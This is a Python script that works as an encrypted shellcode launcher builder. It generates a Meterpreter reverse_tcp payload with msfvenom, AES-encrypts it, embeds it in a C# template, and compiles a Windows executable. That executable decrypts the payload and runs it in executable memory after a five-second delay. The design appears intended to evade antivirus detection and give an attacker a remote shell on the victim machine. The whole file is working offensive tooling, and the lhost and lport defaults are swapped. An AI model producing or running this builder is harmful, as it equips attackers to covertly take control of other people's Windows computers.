#!/usr/bin/env python3
import array, base64
from Crypto.Cipher import AES
from hashlib import sha256
import argparse, subprocess, os

def main():
	args = parse_args()
	lhost = args.lhost
	lport = args.lport
	key = args.key
	payload = args.payload
	filename = args.filename
	arch = args.arch

	''' generate msfvenom payload '''
	print("[+] Generating MSFVENOM payload...")
	result = subprocess.run(['msfvenom',
		'-p', payload,
		'-a', arch,
		'LPORT=' + lport,
		'LHOST=' + lhost,
		'-f', 'raw'],
		capture_output=True)
	buf = result.stdout

	''' encrypt the payload '''
	print("[+] Encrypting the payload...")
	hkey = hash_key(key)
	encrypted = encrypt(hkey, hkey[:16], buf)
	b64 = base64.b64encode(encrypted)

	''' change template '''
	print("[+] Generating launcher.cs file...")
	template = get_decryptor_template()
	template = template.replace('~BASE64~', b64.decode('utf-8'))
	template =  template.replace('~KEY~', key)

	'''save template to .cs file'''
	f = open("./launcher.cs", "w")
	f.write(template)
	f.close()

	'''compile file'''
	print("[+] Compiling the launcher...")
	os.system("mcs /platform:" + arch + " ./launcher.cs /out:./" + filename  + ">/dev/null");

	print("[+] Launcher compiled and written to ./" + filename)
	print("[+] Have a nice day!")

def encrypt(key,iv,plaintext):
	key_length = len(key)
	if (key_length >= 32):
		k = key[:32]
	elif (key_length >= 24):
		k = key[:24]
	else:
		k = key[:16]

	aes = AES.new(k, AES.MODE_CBC, iv)
	pad_text = pad(plaintext, 16)
	return aes.encrypt(pad_text)

def hash_key(key):
	h = ''
	for c in key:
		h += hex(ord(c)).replace("0x", "")
	h = bytes.fromhex(h)
	hashed = sha256(h).digest()
	return hashed

def pad(data, block_size):
	padding_size = (block_size - len(data)) % block_size
	if padding_size == 0:
		padding_size = block_size
	padding = (bytes([padding_size]) * padding_size)
	return data + padding

def parse_args():
	parser = argparse.ArgumentParser()

	parser.add_argument("-k", "--key", default="l33tcrpyto", type=str,
		help="The key used to encrypt the msfvenom payload.")
	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
		help="The local port that msfconsole is listening on.")
	parser.add_argument("-i", "--lhost", default="4444", type=str,
			help="The local host that msfconsole is listening on.")
	parser.add_argument("-p", "--payload", default = "windows/meterpreter/reverse_tcp", type=str,
		help="The payload to generate in msfvenom.")
	parser.add_argument("-a", "--arch", default="x86",
		help="The target architecture (x64 or x86)")
	parser.add_argument("-f", "--filename", default = "launcher.exe", type=str,
		help="The filename of the executable.")

	return parser.parse_args()

def get_decryptor_template():
	return '''
using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace Launcher
{
    static class Program
    {

#region "Win32 InteropServices definitions"

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect
         );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, 
            UInt32 dwMilliseconds
        );

#endregion

        static void Main()
        {

            // place your own encrypted base64 aes string in here - e.g. meterpreter payload. Use the encryptor.cs file to create.
            string shellcodeb64 = "~BASE64~";

            // remember to change the encryption key!
            byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);

						System.Threading.Thread.Sleep(5000);

            RunShellcode(dec_shellcode);
        }

        public static void RunShellcode(byte[] shellcode)
        {
            // 0x1000 = MEM_COMMIT
            // 0x40 = PAGE_EXECUTE_READWRITE
            IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
            IntPtr thread = IntPtr.Zero;
            UInt32 threadId = 0;
            thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }

        static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}
'''
if __name__ == '__main__':
	main()
